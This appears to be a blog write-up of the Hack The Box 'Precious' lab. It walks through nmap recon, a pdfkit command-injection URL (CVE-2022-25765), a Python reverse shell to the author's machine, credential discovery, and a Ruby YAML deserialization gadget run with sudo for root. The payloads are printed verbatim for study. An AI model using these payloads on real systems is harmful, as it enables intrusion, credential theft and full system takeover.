@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+
+<html lang="en">
+  <head>
+    <link rel="stylesheet" href="/_assets/css/styles.css"> 
+    <meta charset="utf-8">
+    <title>Precious Writeup</title>
+  </head>
+  <body class="page-body">
+    <div class="page-body-container">
+      <div class="page-body-content-container">
+        <h1 class="page-title">Precious Writeup</h1>
+        
+        
+        
+        
+        <p class="page-date-author-readtime">March 24, 2023 | 8 minutes </p>
+      
+        
+<h3 id="tcp-nmap-scan">TCP Nmap Scan</h3>
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span> <span class="n">Nmap</span> <span class="mi">7</span><span class="p">.</span><span class="mi">93</span> <span class="n">scan</span> <span class="n">initiated</span> <span class="n">Mon</span> <span class="n">Feb</span> <span class="mi">20</span> <span class="mi">17</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">13</span> <span class="mi">2023</span> <span class="n">as</span><span class="p">:</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">-</span><span class="n">sCV</span> <span class="c1">--min-rate=10000 -o preciousnmap.txt 10.10.11.189</span>
+<span class="n">Warning</span><span class="p">:</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">189</span> <span class="n">giving</span> <span class="n">up</span> <span class="n">on</span> <span class="n">port</span> <span class="n">because</span> <span class="n">retransmission</span> <span class="n">cap</span> <span class="n">hit</span> <span class="p">(</span><span class="mi">10</span><span class="p">).</span>
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">precious</span><span class="p">.</span><span class="n">htb</span> <span class="p">(</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">189</span><span class="p">)</span>
+<span class="n">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">090</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">65257</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">),</span> <span class="mi">276</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="n">p1</span> <span class="n">Debian</span> <span class="mi">5</span><span class="o">+</span><span class="n">deb11u1</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span>
+<span class="err">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
+<span class="err">|</span>   <span class="mi">3072</span> <span class="mf">845e13</span><span class="n">a8e31e20661d235550f63047d2</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="err">|</span>   <span class="mi">256</span> <span class="n">a2ef7b9665ce4161c467ee4e96c7c892</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="err">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">33053</span><span class="n">dcd7ab798458239e7ae3c91a658</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mi">1</span><span class="p">.</span><span class="mi">18</span><span class="p">.</span><span class="mi">0</span>
+<span class="err">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Convert</span> <span class="n">Web</span> <span class="n">Page</span> <span class="n">to</span> <span class="n">PDF</span>
+<span class="err">|</span> <span class="n">http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> 
+<span class="err">|</span>   <span class="n">nginx</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">18</span><span class="p">.</span><span class="mi">0</span>
+<span class="err">|</span><span class="n">_</span>  <span class="n">nginx</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">18</span><span class="p">.</span><span class="mi">0</span> <span class="o">+</span> <span class="n">Phusion</span> <span class="n">Passenger</span><span class="p">(</span><span class="n">R</span><span class="p">)</span> <span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">15</span>
+<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+
+<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="p">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="p">.</span>
+<span class="o">#</span> <span class="n">Nmap</span> <span class="n">done</span> <span class="n">at</span> <span class="n">Mon</span> <span class="n">Feb</span> <span class="mi">20</span> <span class="mi">17</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="mi">2023</span> <span class="c1">-- 1 IP address (1 host up) scanned in 21.95 seconds</span>
+</code></pre></div></div>
+
+<p>The website has a text input box, and the purpose of it is to convert web pages to PDF files. I started playing around with it:</p>
+
+<p><code class="language-plaintext highlighter-rouge">10.10.11.189</code> returned <code class="language-plaintext highlighter-rouge">You should provide a valid URL!</code>.
+<code class="language-plaintext highlighter-rouge">http://10.10.11.189</code> returned <code class="language-plaintext highlighter-rouge">Cannot load remote URL!</code>. Okay, so I can assume it’s expecting a <code class="language-plaintext highlighter-rouge">http://</code> format, especially considering that it was expecting a URL and it changed its output.</p>
+
+<p><img src="/_assets/images/writeups/2023-03-25-precious.md/img1.png" alt="" /></p>
+
+<p>So I couldn’t access the web page of itself, so how about another IP on its network? How about me? So I spun up my own web server with the Python http.server module: <code class="language-plaintext highlighter-rouge">python3 -m http.server 80 </code></p>
+<ul>
+  <li>It’s important to specify port 80 because the default port for Python’s http.server is 8080, and that’s not what the website is expecting.</li>
+</ul>
+
+<p>I inputted my own (VPN) IP in the <code class="language-plaintext highlighter-rouge">http://</code> format: <code class="language-plaintext highlighter-rouge">http://10.10.14.4</code>, and what do you know, it created a PDF of my web page :)</p>
+
+<p><img src="/_assets/images/writeups/2023-03-25-precious.md/img2.png" alt="" /></p>
+
+<p>Now that I had something new to work with, I wanted to know more about this file. I ran a common file forensics tool called <code class="language-plaintext highlighter-rouge">exiftool</code> on the file: 
+<code class="language-plaintext highlighter-rouge">exiftool fo99la37ukytqmhduq8elzoqbudbyvu9.pdf </code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ExifTool Version Number         : 12.52
+File Name                       : fo99la37ukytqmhduq8elzoqbudbyvu9.pdf
+Directory                       : .
+File Size                       : 36 kB
+File Modification Date/Time     : 2023:02:20 16:39:42-08:00
+File Access Date/Time           : 2023:02:20 16:40:16-08:00
+File Inode Change Date/Time     : 2023:02:20 16:39:42-08:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.4
+Linearized                      : No
+Page Count                      : 1
+Creator                         : Generated by pdfkit v0.8.6
+</code></pre></div></div>
+
+<p>The important line here is <code class="language-plaintext highlighter-rouge">Creator: Generated by pdfkit v0.8.6</code>
+This immediately sparked my eye, mainly because it had a version number which is important when searching for valid exploits. I searched <code class="language-plaintext highlighter-rouge">pdfkit v0.8.6 exploits</code> and the first thing that popped up was “Command Injection in pdfkit | CVE-2022-25765”.</p>
+
+<p>After looking through this exploit’s documentation, all I had to do was establish a parameter containing a URL encoded character, and specify the shell command I wanted it to execute: ``http://10.10.14.4?bruh=%20<code class="language-plaintext highlighter-rouge">id</code></p>
+
+<p><img src="/_assets/images/writeups/2023-03-25-precious.md/img3.png" alt="" /></p>
+
+<ul>
+  <li>One important think I learned is that when I need to type tedious things, just copy and paste T_T. I’m a fast typer, and a pretty accurate one too, but sometimes even a single typo can invalidate your exploit. After all, exploits are usually unusual vulnerabilities</li>
+</ul>
+
+<p>After inputting this to the site, I was returned a pdf that displayed my user id. Confirming that code injection worked, I chose to establish a reverse shell using Python: 
+When establishing a reverse shell, you want to have a listener on your attacking machine, and for your victim machine to execute code that will establish remote connection to <strong>you</strong>.</p>
+
+<p>I had checked Python was on the box with: ``http://10.10.14.4?bruh=%20<code class="language-plaintext highlighter-rouge">which python3</code></p>
+
+<p><img src="/_assets/images/writeups/2023-03-25-precious.md/img4.png" alt="" /></p>
+
+<p>Listener on attacking machine: <code class="language-plaintext highlighter-rouge">nc -lvnp 6666</code> - * <em>You can choose any port number, I just like 6666 (:</em> *</p>
+
+<p>Code to be executed on victim machine: <code class="language-plaintext highlighter-rouge">python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.4",6666));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'</code></p>
+
+<p>Formatted string to the input box on the website that is vulnerable to code injection, therefore will run the above command: <code class="language-plaintext highlighter-rouge">http://10.10.14.4?bruh=%20`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.4",6666));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'</code></p>
+
+<p>And just like that, after sending that request to the page, I got a shell in my terminal.</p>
+
+<p><img src="/_assets/images/writeups/2023-03-25-precious.md/img5.png" alt="" /></p>
+
+<h4 id="privilege-escalation">Privilege Escalation</h4>
+<p>I had access to the machine, but I was user <code class="language-plaintext highlighter-rouge">ruby</code>. I explored my scope by <code class="language-plaintext highlighter-rouge">cd</code>ing around, but what I had needed was right there in my home directory the entire time. <code class="language-plaintext highlighter-rouge">ls -lah</code> revealed the <code class="language-plaintext highlighter-rouge">.bundle</code> directory. In this directory was a file named <code class="language-plaintext highlighter-rouge">config</code>, in which <code class="language-plaintext highlighter-rouge">cat config</code> revealed creds to the user <code class="language-plaintext highlighter-rouge">henry</code>.</p>
+
+<p><img src="/_assets/images/writeups/2023-03-25-precious.md/img6.png" alt="" /></p>
+
+<p>I always <code class="language-plaintext highlighter-rouge">ssh</code> into new users if possible, because I want a fully interactive shell. I <code class="language-plaintext highlighter-rouge">ssh</code>d into user <code class="language-plaintext highlighter-rouge">henry</code> and from here I got the user hash in <code class="language-plaintext highlighter-rouge">user.txt</code>.</p>
+
+<p><img src="/_assets/images/writeups/2023-03-25-precious.md/img7.png" alt="" /></p>
+
+<p>From here, the next and last step was getting <code class="language-plaintext highlighter-rouge">root</code>. The first thing I ran was <code class="language-plaintext highlighter-rouge">sudo -l</code> and what do ya know, I can run a certain command as root :)</p>
+
+<p><img src="/_assets/images/writeups/2023-03-25-precious.md/img8.png" alt="" /></p>
+
+<p>Now I’m not pro at ruby; actually, I know essentially nothing about ruby. But I tried running this command, and it gave me an error output:</p>
+
+<p><img src="/_assets/images/writeups/2023-03-25-precious.md/img9.png" alt="" /></p>
+
+<p>It was telling me that on execution, ruby was expecting <code class="language-plaintext highlighter-rouge">dependencies.yml</code>. Although the other paths were absolute file paths, I assumed that the <code class="language-plaintext highlighter-rouge">dependencies.yml</code> was a relative file path to my home directory. So to test this out, I created <code class="language-plaintext highlighter-rouge">dependencies.yml</code> in my home directory. Then I tried running it again. This time I got a different output:</p>
+
+<p><img src="/_assets/images/writeups/2023-03-25-precious.md/img10.png" alt="" /></p>
+
+<p>This told me that this was the file that it was looking for. Now, how could I escalate my privilege with this?</p>
+
+<p>I read up on what <code class="language-plaintext highlighter-rouge">dependencies.yml</code> typically contains in the context of <code class="language-plaintext highlighter-rouge">ruby</code>. The more I thought about it, the more I realized that I could possibly achieve code exeuction through this file, as the command indeed was reading the file: <code class="language-plaintext highlighter-rouge">YAML.load(File.read("dependencies.yml"))</code></p>
+
+<p><img src="/_assets/images/writeups/2023-03-25-precious.md/img11.png" alt="" /></p>
+
+<p>So I searched for <code class="language-plaintext highlighter-rouge">ruby yaml exploits</code> and oh wow, there’s an exploit that perfectly does what I want it to do (: %%I learned that this kind of exploit is called deserialization%%</p>
+
+<p>https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ---
+ - !ruby/object:Gem::Installer
+     i: x
+ - !ruby/object:Gem::SpecFetcher
+     i: y
+ - !ruby/object:Gem::Requirement
+   requirements:
+     !ruby/object:Gem::Package::TarReader
+     io: &amp;1 !ruby/object:Net::BufferedIO
+       io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry
+          read: 0
+          header: "abc"
+       debug_output: &amp;1 !ruby/object:Net::WriteAdapter
+          socket: &amp;1 !ruby/object:Gem::RequestSet
+              sets: !ruby/object:Net::WriteAdapter
+                  socket: !ruby/module 'Kernel'
+                  method_id: :system
+              git_set: id
+          method_id: :resolve
+</code></pre></div></div>
+
+<p>The important line here is <code class="language-plaintext highlighter-rouge">git_set</code>, the parameter where I specify the shell command I want executed. I copied and pasted this into <code class="language-plaintext highlighter-rouge">dependencies.yml</code>. I tried <code class="language-plaintext highlighter-rouge">id</code> initially, in which I got <code class="language-plaintext highlighter-rouge">henry</code>’s id returned to me. I tried running it with <code class="language-plaintext highlighter-rouge">sudo</code>, and I got <code class="language-plaintext highlighter-rouge">root</code>’s id returned to me!</p>
+
+<p><img src="/_assets/images/writeups/2023-03-25-precious.md/img12.png" alt="" /></p>
+
+<p><img src="/_assets/images/writeups/2023-03-25-precious.md/img13.png" alt="" /></p>
+
+<p>And the last step was running a shell command that would get me to <code class="language-plaintext highlighter-rouge">root</code>. I changed <code class="language-plaintext highlighter-rouge">git_set: id</code> to <code class="language-plaintext highlighter-rouge">git_set: su</code>. Then I executed the command again with <code class="language-plaintext highlighter-rouge">sudo</code>.</p>
+
+<p><img src="/_assets/images/writeups/2023-03-25-precious.md/img14.png" alt="" /></p>
+
+<p>Bing bang boom, <code class="language-plaintext highlighter-rouge">root</code> :P
+<img src="/_assets/images/writeups/2023-03-25-precious.md/img15.png" alt="" /></p>
+
+<p>Something kinda fun I want to point out is how ruby is an interpreted language, meaning that the code runs line by line as it is interpreted into machine language. It is only when it encounters an error that it then stops running. This is why the code was able to run and provide me the output of <code class="language-plaintext highlighter-rouge">id</code> and even execute <code class="language-plaintext highlighter-rouge">su</code>, while returning error messages afterwards.</p>
+
+
+        
+      </div>
+      
+      
+      
+  </div> <!-- page-body-container END-->
+  </body>
+  <script>
+  $(document).ready(function() {
+  var toc = $("#toc"); // target the table of contents element
+  var tocEntries = toc.find("a"); // target the links within the table of contents
+  
+  $(window).scroll(function() {
+    // get the current scroll position of the window
+    var currentPosition = $(this).scrollTop();
+    
+    // loop through each link in the table of contents
+    tocEntries.each(function() {
+      // get the ID of the section of content that this link points to
+      var target = $(this).attr("href");
+      
+      // use the ID to target the corresponding section of content
+      var section = $(target);
+      
+      // if the section exists and its top position is within the current viewport
+      if (section.length && section.offset().top <= currentPosition + 200) {
+        // remove the active class from all links in the table of contents
+        tocEntries.removeClass("active");
+        
+        // add the active class to the link that corresponds to the current section
+        $(this).addClass("active");
+      }
+    });
+  });
+  });
+
+  </script>
+
+</html>
+
